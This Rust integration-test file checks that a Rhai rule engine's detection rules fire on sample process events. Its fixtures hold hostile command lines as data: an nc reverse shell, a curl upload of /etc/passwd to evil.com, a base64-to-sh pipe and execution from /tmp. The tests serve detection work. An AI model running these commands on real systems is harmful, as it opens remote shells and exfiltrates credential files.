//! Integration-tests for the Rhai rule engine
//! (lives in `tests/engine.rs`, so it is compiled as a
//! separate crate that depends on `flying_ace_engine`)
#[cfg(test)]
mod tests {
    use flying_ace_engine::{EcsRhaiEngine, ProcessEvent};

    /// Convenience helper – the engine always loads rules from `rules/`
    fn new_engine() -> EcsRhaiEngine {
        EcsRhaiEngine::new_from_dir("rules")
    }

    /// An empty `ProcessEvent` with sensible defaults – lets us override only what each test needs.
    /// *Everything* in `ProcessEvent` is `pub`, so we can build it literally.
    fn base_event() -> ProcessEvent {
        ProcessEvent {
            timestamp: "2025-06-04T12:00:00Z".into(),
            ecs_version: "8.11.0".into(),
            event_kind: "event".into(),
            event_category: "process".into(),
            event_type: "start".into(),
            event_action: None,
            event_code: None,
            event_module: None,
            process_name: String::new(),
            process_pid: 0,
            process_args: None,
            process_executable: None,
            process_ppid: None,
            process_pname: None,
            process_working_directory: None,
            host_name: None,
            host_id: None,
            user_name: None,
            user_id: None,
            agent_type: None,
        }
    }

    // -----------------------------------------------------------------------------
    // Individual rule-behaviour tests
    // -----------------------------------------------------------------------------

    #[test]
    fn engine_matches_existing_rules_on_disk() {
        let engine = new_engine();

        let mut event = base_event();
        event.process_name = "nc".into();
        event.process_pid = 1234;

        let matched = engine.eval(&event);
        assert!(
            matched.contains(&"suspicious_process".to_string()),
            "Rule did not match – got: {:?}",
            matched
        );
    }

    #[test]
    fn reverse_shell_nc() {
        let engine = new_engine();

        let mut event = base_event();
        event.timestamp = "2025-06-04T12:05:00Z".into();
        event.process_name = "nc".into();
        event.process_pid = 4242;
        event.process_args = Some("nc 10.0.0.1 4444 -e /bin/bash".into());

        let matched = engine.eval(&event);
        assert!(
            matched.contains(&"reverse_shell_nc".to_string()),
            "Rule did not match – got: {:?}",
            matched
        );
    }

    #[test]
    fn curl_upload_file() {
        let engine = new_engine();

        let mut event = base_event();
        event.timestamp = "2025-06-04T12:06:00Z".into();
        event.process_name = "curl".into();
        event.process_pid = 5252;
        event.process_args = Some("curl https://evil.com --upload-file /etc/passwd".into());

        let matched = engine.eval(&event);
        assert!(
            matched.contains(&"curl_upload_file".to_string()),
            "Rule did not match – got: {:?}",
            matched
        );
    }

    #[test]
    fn curl_upload_file_regex() {
        let engine = new_engine();

        let mut event = base_event();
        event.timestamp = "2025-06-04T12:06:00Z".into();
        event.process_name = "curl".into();
        event.process_pid = 5252;
        event.process_args = Some("curl https://evil.com --upload-file /etc/passwd".into());

        let matched = engine.eval(&event);
        assert!(
            matched.contains(&"curl_upload_file_regex".to_string()),
            "Regex rule did not trigger – got: {:?}",
            matched
        );
    }

    #[test]
    fn exec_from_tmp() {
        let engine = new_engine();

        let mut event = base_event();
        event.timestamp = "2025-06-04T12:07:00Z".into();
        event.process_name = "malware".into();
        event.process_pid = 6262;
        event.process_executable = Some("/tmp/evil.bin".into());

        let matched = engine.eval(&event);
        assert!(
            matched.contains(&"exec_from_tmp".to_string()),
            "Rule did not match – got: {:?}",
            matched
        );
    }

    #[test]
    fn bash_base64_execution() {
        let engine = new_engine();

        let mut event = base_event();
        event.timestamp = "2025-06-04T12:08:00Z".into();
        event.process_name = "bash".into();
        event.process_pid = 7272;
        event.process_args = Some(r#"bash -c "echo YmFkCg== | base64 -d | sh""#.into());

        let matched = engine.eval(&event);
        assert!(
            matched.contains(&"bash_base64_execution".to_string()),
            "Rule did not match – got: {:?}",
            matched
        );
    }

    #[test]
    fn privileged_user_uid0() {
        let engine = new_engine();

        let mut event = base_event();
        event.timestamp = "2025-06-04T12:09:00Z".into();
        event.process_name = "bash".into();
        event.process_pid = 8080;
        event.user_id = Some(0); // root

        let matched = engine.eval(&event);
        assert!(
            matched.contains(&"privileged_user_uid0".to_string()),
            "Rule did not match on uid=0 – got: {:?}",
            matched
        );
    }
}
